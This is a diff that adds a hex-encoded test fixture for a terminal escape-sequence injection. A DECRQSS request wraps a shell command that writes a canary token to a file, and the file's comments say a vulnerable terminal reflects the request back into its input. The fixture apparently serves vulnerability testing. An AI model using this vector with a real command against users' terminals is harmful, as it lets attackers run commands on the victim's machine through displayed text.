@@ -1,0 +1,7 @@
+# canary-forked DECRQSS reflection -- see meta.yaml / expected.md. HEX ONLY.
+# ESC P $ q  (DECRQSS request introducer)
+1b 50 24 71
+# <canary-forked command>: printf %s "$POC_CANARY_TOKEN" > "$POC_CANARY"
+70 72 69 6e 74 66 20 25 73 20 22 24 50 4f 43 5f 43 41 4e 41 52 59 5f 54 4f 4b 45 4e 22 20 3e 20 22 24 50 4f 43 5f 43 41 4e 41 52 59 22
+# ESC \  (String Terminator) -- a vuln terminal reflects the request to the input
+1b 5c
